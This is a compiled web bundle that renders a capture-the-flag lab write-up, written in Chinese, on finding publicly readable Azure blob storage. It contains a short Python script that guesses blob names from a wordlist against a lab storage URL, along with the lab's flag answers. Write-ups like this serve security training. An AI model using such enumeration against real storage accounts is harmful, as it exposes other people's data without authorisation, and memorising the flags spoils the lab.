"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4708],{78783:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>u,frontMatter:()=>i,metadata:()=>o,toc:()=>l});const o=JSON.parse('{"id":"Independent-Environment/RedLabs/AllLabs/StorageAccount17/index","title":"Storage Account 17 - Enumerate Blob Name","description":"Enumerate Blob Name","source":"@site/docs/Independent-Environment/RedLabs/AllLabs/StorageAccount17/index.md","sourceDirName":"Independent-Environment/RedLabs/AllLabs/StorageAccount17","slug":"/Independent-Environment/RedLabs/AllLabs/StorageAccount17/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/RedLabs/AllLabs/StorageAccount17/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/RedLabs/AllLabs/StorageAccount17/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"Storage Account 14 - Minting SAS URI","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/RedLabs/AllLabs/StorageAccount14/"},"next":{"title":"Azure Penetration Testing","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/RedLabs/AzurePenetrationTesting/"}}');var s=t(74848),r=t(28453);const i={},a="Storage Account 17 - Enumerate Blob Name",c={},l=[];function d(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components},{Details:t}=n;return t||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"storage-account-17---enumerate-blob-name",children:"Storage Account 17 - Enumerate Blob Name"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"Enumerate Blob Name"}),"\n"]}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Scenario"})}),(0,s.jsx)(n.p,{children:"Storage Account is a service provided by Azure, since Storage Accounts have a globally unique name it is possible to perform subdomain enumeration and access Storage Account containers that have anonymous access enabled on them. Find one now using the wordlist provided."}),(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Overview"})}),(0,s.jsx)(n.p,{children:"What is anonymous blob or container access?"}),(0,s.jsx)(n.p,{children:'Azure Blob Storage provides the user settings to enable public access to individual blobs or containers. Setting the access level of a container or blob to "Public Blob" or "Public Container" allows anonymous read access to the resources.'}),(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Hint"})}),(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Storage account containers and blobs can be accessed anonymously."}),"\n"]}),(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Impact"})}),(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"A lot of companies allow anonymous container access which could unauthorized access to data, data leakage malicious activity in some cases anonymous access due to lack of accountability it becomes difficult to identify the source of unauthorized access to the resource, which can hinder incident response and forensic investigations during security incidents."}),"\n",(0,s.jsx)(n.li,{children:"Enabling anonymous access may introduce compliance and regulatory challenges, especially if the data stored in the container is subject to specific regulations or data protection requirements."}),"\n"]}),(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Reference"})}),(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction",children:"Storage Blob Docs"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/maurosoria/dirsearch",children:"Dirsearch"})}),"\n"]})]}),"\n",(0,s.jsx)(n.p,{children:"\u9898\u76ee\u7ed9\u51fa\u4e86\u4e24\u4e2a\u4fe1\u606f\uff0c\u5206\u522b\u662f BlobURL \u548c Wordlist"}),"\n",(0,s.jsx)(n.p,{children:"\u7b80\u5355\u5199\u4e00\u4e2a\u7206\u7834\u811a\u672c\u904d\u5386\u4e00\u4e0b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'import requests\n\nwith open("./wordlist.txt", "r") as file:\n    dics = [line.strip() for line in file.readlines()]\n\nbase_url = "https://asgqhykbaxts735.blob.core.windows.net/aslpezroxubd735/"\n\nfor dic in dics:\n    url = base_url + dic\n    response = requests.get(url)\n    if response.status_code == 200:\n        print(f"Found: {url}")\n        print(response.content.decode())\n        break\n    else:\n        print(f"Not Found: {url}")\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u8fd0\u884c\u5373\u53ef\u5f97\u5230\u7ed3\u679c"}),"\n",(0,s.jsx)(n.admonition,{title:"Flags",type:"info",children:(0,s.jsxs)(t,{children:[(0,s.jsx)("summary",{children:" What technique did we use to find the blob name? (subdomain enumeration or directory busting) "}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"directory busting\n"})}),(0,s.jsx)("summary",{children:" What is the flag value? "}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"asktpsnfylic735asshodzifqvx735\n"})})]})})]})}function u(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>a});var o=t(96540);const s={},r=o.createContext(s);function i(e){const n=o.useContext(r);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),o.createElement(r.Provider,{value:n},e.children)}}}]);